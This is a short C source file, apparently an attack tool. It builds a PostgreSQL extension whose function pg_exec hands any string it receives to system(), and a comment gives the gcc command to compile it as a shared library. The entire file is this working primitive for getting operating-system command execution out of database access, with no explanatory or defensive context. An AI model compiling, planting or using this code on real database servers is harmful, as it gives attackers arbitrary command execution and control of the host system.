// gcc -I/usr/include/postgresql/18/server -shared -fPIC -o udf.so udf.c

#include "string.h"
#include "postgres.h"
#include "fmgr.h"

PG_MODULE_MAGIC;
PG_FUNCTION_INFO_V1(pg_exec);

Datum
pg_exec(PG_FUNCTION_ARGS)
{
    char* command = PG_GETARG_CSTRING(0);
    PG_RETURN_INT32(system(command));
}